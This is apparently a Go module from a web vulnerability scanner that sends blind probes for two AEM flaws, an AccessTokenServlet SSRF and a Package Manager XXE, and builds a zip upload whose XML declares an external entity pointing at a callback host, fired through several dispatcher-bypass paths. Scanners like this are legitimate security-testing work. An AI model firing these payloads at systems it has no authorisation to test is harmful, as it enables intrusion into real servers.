// Package aem_oob_injection fires out-of-band probes for two AEM server-side
// request vulnerabilities that can only be confirmed via a collaborator callback:
// the AccessTokenServlet full-read SSRF (CVE-2025-54249) and the CRX Package
// Manager blind XXE (CVE-2025-54251). Like the routing-ssrf OAST oracle, it is
// fire-and-forget: a hit is observed out-of-band and the finding is correlated by
// the OAST service, so ScanPerHost plants the payloads and returns no synchronous
// result. It is a no-op when OAST is not configured.
package aem_oob_injection

import (
	"archive/zip"
	"bytes"
	"mime/multipart"
	"net/url"
	"strings"

	"github.com/vigolium/vigolium/pkg/dedup"
	"github.com/vigolium/vigolium/pkg/http"
	"github.com/vigolium/vigolium/pkg/httpmsg"
	aem "github.com/vigolium/vigolium/pkg/modules/infra/aem"
	"github.com/vigolium/vigolium/pkg/modules/modkit"
	"github.com/vigolium/vigolium/pkg/oast/oastclass"
	"github.com/vigolium/vigolium/pkg/output"
)

// maxFireForms bounds how many dispatcher-bypass variants each blind payload is
// fired through (clean form first). More shots raise the odds of clearing a
// partial dispatcher lock-down; the ceiling keeps the traffic bounded.
const maxFireForms = 4

const (
	accessTokenBase = "/services/accesstoken/verify"
	packmgrBase     = "/crx/packmgr/service/exec.json?cmd=upload&jsonInTextarea=true"
)

type Module struct {
	modkit.BaseActiveModule
	ds dedup.Lazy[dedup.DiskSet]
}

func New() *Module {
	m := &Module{
		BaseActiveModule: modkit.NewBaseActiveModule(
			ModuleID,
			ModuleName,
			ModuleDesc,
			ModuleShort,
			ModuleConfirmation,
			ModuleSeverity,
			ModuleConfidence,
			modkit.ScanScopeHost,
			modkit.AllInsertionPointTypes,
		),
		ds: dedup.LazyDiskSet("aem_oob_injection"),
	}
	m.ModuleTags = ModuleTags
	return m
}

func (m *Module) IncludesBaseCanProcess() bool { return false }

func (m *Module) CanProcess(ctx *httpmsg.HttpRequestResponse) bool {
	return ctx != nil && ctx.Request() != nil
}

func (m *Module) ScanPerHost(
	ctx *httpmsg.HttpRequestResponse,
	httpClient *http.Requester,
	scanCtx *modkit.ScanContext,
) ([]*output.ResultEvent, error) {
	urlx, err := ctx.URL()
	if err != nil {
		return nil, nil
	}
	host := urlx.Host

	if !modkit.BeginHostProbeKey(scanCtx, httpClient, &m.ds, host) {
		return nil, nil
	}

	oast := scanCtx.OASTProv()
	if oast == nil || !oast.Enabled() {
		return nil, nil // blind checks require a collaborator
	}
	if !aem.ConfirmAEM(ctx, httpClient, scanCtx) {
		return nil, nil
	}

	m.fireAccessTokenSSRF(ctx, httpClient, oast, urlx.String())
	m.firePackmgrXXE(ctx, httpClient, oast, urlx.String())
	return nil, nil // fire-and-forget: callbacks are correlated by the OAST service
}

// endpointExists reports whether the servlet at base is a specific mount on this
// AEM instance (via the shared aem.ServletPresent reachability gate: responds like a
// handler AND a random sibling 404s) — so a blind payload is only ever sent to an
// endpoint that is really present, not to a catch-all and not merely because the
// host is AEM.
func endpointExists(ctx *httpmsg.HttpRequestResponse, httpClient *http.Requester, base string) bool {
	path := base
	if i := strings.IndexByte(path, '?'); i >= 0 {
		path = path[:i]
	}
	return aem.ServletPresent(ctx, httpClient, path)
}

func (m *Module) fireAccessTokenSSRF(
	ctx *httpmsg.HttpRequestResponse,
	httpClient *http.Requester,
	oast modkit.OASTProvider,
	target string,
) {
	if !endpointExists(ctx, httpClient, accessTokenBase) {
		return // the AccessTokenServlet is not present — do not fire a blind SSRF
	}
	oastHost := modkit.OASTURLFor(oast, oastclass.SSRF, target, "auth_url", "aem-accesstoken-ssrf", ModuleID, ctx.Request().ID())
	if oastHost == "" {
		return
	}
	cb := "http://" + oastHost + "/"
	oast.RecordPayload(oastHost, "auth_url="+cb)

	body := url.Values{"auth_url": {cb}}.Encode()
	for _, p := range aem.CappedBypasses(accessTokenBase, maxFireForms) {
		aem.Post(ctx, httpClient, p, body, map[string]string{"Content-Type": "application/x-www-form-urlencoded"})
	}
}

func (m *Module) firePackmgrXXE(
	ctx *httpmsg.HttpRequestResponse,
	httpClient *http.Requester,
	oast modkit.OASTProvider,
	target string,
) {
	if !endpointExists(ctx, httpClient, packmgrBase) {
		return // the CRX Package Manager service is not present — do not upload the XXE package
	}
	oastHost := modkit.OASTURLFor(oast, oastclass.XXE, target, "package", "aem-packmgr-xxe", ModuleID, ctx.Request().ID())
	if oastHost == "" {
		return
	}
	cb := "http://" + oastHost + "/"
	oast.RecordPayload(oastHost, "privileges.xml SYSTEM "+cb)

	mpBody, ct, err := buildPackageUpload(cb)
	if err != nil {
		return
	}
	for _, p := range aem.CappedBypasses(packmgrBase, maxFireForms) {
		aem.Post(ctx, httpClient, p, mpBody, map[string]string{"Content-Type": ct})
	}
}

// buildPackageUpload returns a multipart body (and its Content-Type) carrying a
// CRX package whose META-INF/vault/privileges.xml declares an external entity
// pointing at cb. The XML entry is stored uncompressed so the callback host is
// inspectable on the wire; AEM unpacks it either way.
func buildPackageUpload(cb string) (body, contentType string, err error) {
	var zbuf bytes.Buffer
	zw := zip.NewWriter(&zbuf)

	if _, err = zw.Create("jcr_root/empty.txt"); err != nil {
		return "", "", err
	}
	xw, err := zw.CreateHeader(&zip.FileHeader{Name: "META-INF/vault/privileges.xml", Method: zip.Store})
	if err != nil {
		return "", "", err
	}
	xml := `<?xml version="1.0" encoding="UTF-8"?>` +
		`<!DOCTYPE x [<!ENTITY foo SYSTEM "` + cb + `">]>` +
		`<x>&foo;</x>`
	if _, err = xw.Write([]byte(xml)); err != nil {
		return "", "", err
	}
	if err = zw.Close(); err != nil {
		return "", "", err
	}

	var mbuf bytes.Buffer
	mw := multipart.NewWriter(&mbuf)
	fw, err := mw.CreateFormFile("package", "vig.zip")
	if err != nil {
		return "", "", err
	}
	if _, err = fw.Write(zbuf.Bytes()); err != nil {
		return "", "", err
	}
	if err = mw.Close(); err != nil {
		return "", "", err
	}
	return mbuf.String(), mw.FormDataContentType(), nil
}
